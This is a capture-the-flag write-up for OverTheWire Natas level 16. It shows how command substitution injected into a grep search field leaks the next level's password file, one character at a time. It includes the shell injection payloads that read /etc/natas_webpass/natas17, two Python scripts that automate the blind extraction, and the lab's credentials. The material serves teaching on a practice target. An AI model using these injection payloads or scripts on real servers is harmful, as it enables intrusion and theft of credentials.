# Level 15 → Level 16

## Details
Username: `natas16`<br />
Password: `TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V`<br />
URL:      http://natas16.natas.labs.overthewire.org

## Solution
This was one of the challenges that took me the longest. I will spare you all the attempts and only explain the solution.

<img src="./0.png"></img>

<img src="./1.png"></img>

Since I couldn't "break" the quotes, I started running bash code inside them. The main idea behind it is to deduce each time one character in the password according to the output of grep on dictionary.txt. (Similar to the blind sql injection of the previous challenge).

The following code, `$(cut -c 1-1 /etc/natas_webpass/natas17)` extracts the first character in the password. Then the php code will append this character to grep on the dictionay.txt file. Therefore, out of all the words that will appear in the output, the character that will appear in all of them is actually the character that was extracted from the password.

For example: 
<img src="./2.png"></img>

<img src="./3.png"></img>

So, the first char for password of **natas17** is 'x' or 'X'. It is not possible to tell from this output whether it is an uppercase or lowercase letter, because of `grep -i`.

Let's see an example of a password we already know, of the current stage. The first letter in it is 'T'. We will insert the string `$(cut -c 1-1 /etc/natas_webpass/natas16)` in the input and get the following output:

<img src="./4.png"></img>

And so in the meantime we can recognize letters of the password, without knowing if they are uppercase or lowercase. But what about digits? Let's try to see what happens when we exstract a character that is a digit. The fourth character in the password that we already know is the digit '7'. Let's see what the output is when we try to extract this character with the input `$(cut -c 4-4 /etc/natas_webpass/natas16)`:

<img src="./5.png"></img>

Nothing. This means that currently, only letters can be detected in case insensitive form. And it is still not possible to discover digits. We will now build a Python code that extracts all the characters that are letters, and print them in lower case (for convenience).

```python
from requests import post
from requests.utils import quote

PASSWORD_FILENAME = '/etc/natas_webpass/natas17'
PASSWORD_LENGTH = 32
CASE_INSENSITIVE_LETTER_EXTRACTION = "$(cut -c {}-{} {})"

# details for the POST HTTP request.
URL = "http://natas16.natas.labs.overthewire.org/index.php"
HEADERS ={}
HEADERS["Authorization"] = "Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=="
HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
DATA = "needle="

def get_dictionary_words(html):
    """
    Returns a list of all the words that appeared as output
    from dictionary.txt in the html page
    """
    html = html.lower()
    return html[html.find('<pre>')+6:html.find('</pre>')].split('\n')[:-1]

def get_common_letter(words_list):
    """
    Gets a list of words and returns the letter that appeared in all the words.
    """

    # If the list is empty, it is a sign that a digit has been extracted.
    if not words_list: return '_'
    
    # Takes the shortest word, because then the test will be faster.
    words_list.sort(key=len)
    shortes_word = words_list[0]
    
    # If the short word contains one letter, then it is common to all.
    if(len(shortes_word) == 1): return shortes_word
    
    # Looking for the letter that appears in all the words:
    for letter in shortes_word:
        is_common = True  
        
        for word in words_list:
            if letter not in word:
                is_common = False
                break

        if is_common: return letter

password = ""
for i in range(1, PASSWORD_LENGTH+1):
    res = post(url=URL, headers=HEADERS, data=DATA+quote(CASE_INSENSITIVE_LETTER_EXTRACTION.format(i,i,PASSWORD_FILENAME)))
    password += get_common_letter(get_dictionary_words(res.text))
    print("password: " + password.ljust(32, "_"))
```

Take the code above and copy it into a Python file. Run it, and you will get the following output:

<img src="./6.png"></img>

So these are the characters of the password in case insensitive form, where each underscore represents a place of a digit: `xkeuche_sbnkbvh_ru_ksib_uulmi_sd`

# exstract spesific letter from password
`$(cut -c 1-1 /etc/natas_webpass/natas17)`


# convert numbers to chars
`$(printf \\$(printf %03o $((97+$(cut -c 8-8 /etc/natas_webpass/natas17)))))`

# convert char to 'a' just if it was lower case

`$(python3 -c $(echo print\(chr\(97+\(100-ord\($(echo $(python3 -c print\(chr\(34\)\)))$(cut -c 3-3
 b.sh)$(echo $(python3 -c print\(chr\(34\)\)))\)\)\)\)))`

 `$(python3 -c $(echo print\(chr\(97+\(105-ord\($(echo $(python3 -c print\(chr\(34\)\)))$(cut -c 5-5
 /etc/natas_webpass/natas16)$(echo $(python3 -c print\(chr\(34\)\)))\)\)\)\)))`

https://stackoverflow.com/questions/12855610/shell-script-is-there-any-way-converting-number-to-char


and then extract just one letter!
and do it like "blind sql injection"


```python
from requests import post
from requests.utils import quote

PASSWORD_FILENAME = '/etc/natas_webpass/natas17'
PASSWORD_LENGTH = 32
CHAR_EXTRACTION = "$(cut -c {}-{} {})"
DIGIT_EXTRACTION = "$(printf \\\$(printf %03o $((97+$(cut -c {}-{} {})))))"
DETECT_LOWER_CASE = "$(python3 -c $(echo print\(chr\(97+\({}-ord\($(echo $(python3 -c print\(chr\(34\)\)))$(cut -c {}-{} {})$(echo $(python3 -c print\(chr\(34\)\)))\)\)\)\)))"


URL = "http://natas16.natas.labs.overthewire.org/index.php"
HEADERS ={}
HEADERS["Authorization"] =\
"Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=="
HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
DATA = "needle="

def get_dictionary_words(html):
    # This is not what prevents distinction between upper and lowercase letters.
    # but done for convenience.
    html = html.lower()
    return html[html.find('<pre>')+6:html.find('</pre>')].split('\n')
    
def get_common_letter(words_list):
    # remove the last 'word' that equals always to ''
    #words_list = words_list[:-1]
    
    # it's no words so digit here.
    if not words_list: return '_'
    
    # take the shortest word in the list
    words_list.sort(key=len)
    shortes_word = words_list[0]
    
    # if there is word with one character, so this is the common letter.
    if(len(shortes_word) == 1): return shortes_word
    
    # find the letter that apear in every word.
    for letter in shortes_word:
        is_common = True
        
        for word in words_list:
            if letter not in word:
                is_common = False
                break
        
        if is_common: return letter

password = ""

print("FIND CASE-INSENSITIVE LETTERS:") 
for i in range(1, PASSWORD_LENGTH+1):
    response = post(url=URL, headers=HEADERS, data=DATA+quote(CHAR_EXTRACTION.format(i,i,PASSWORD_FILENAME)))
    password += get_common_letter(get_dictionary_words(response.text))
    print("password: " + password.ljust(32, "_"))
    
if '_' in password:
    print("\nFIND DIGITS:") 
    while('_' in password):
        i = password.find('_') + 1
        response = post(url=URL, headers=HEADERS, data=DATA+quote(DIGIT_EXTRACTION.format(i,i,PASSWORD_FILENAME)))
        letter = get_common_letter(get_dictionary_words(response.text))
        digit = str(ord(letter) - ord('a'))
        password = password.replace('_', digit, 1)
        print("password: " + password.ljust(32, "_"))
        
print("\nDETECT UPPER CASE LETTER:")
for i in range(PASSWORD_LENGTH):
    if password[i].isalnum():
        response = post(url=URL, headers=HEADERS, data=DATA+quote(DETECT_LOWER_CASE.format(ord(password[i]),i+1,i+1,PASSWORD_FILENAME)))
        letter = get_common_letter(get_dictionary_words(response.text))
        if letter != 'a':
            password = password[:i] + password[i].upper() + password[i+1:]
            print("password: " + password.ljust(32, "_"))
```

## Password for the next level:
```
XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
```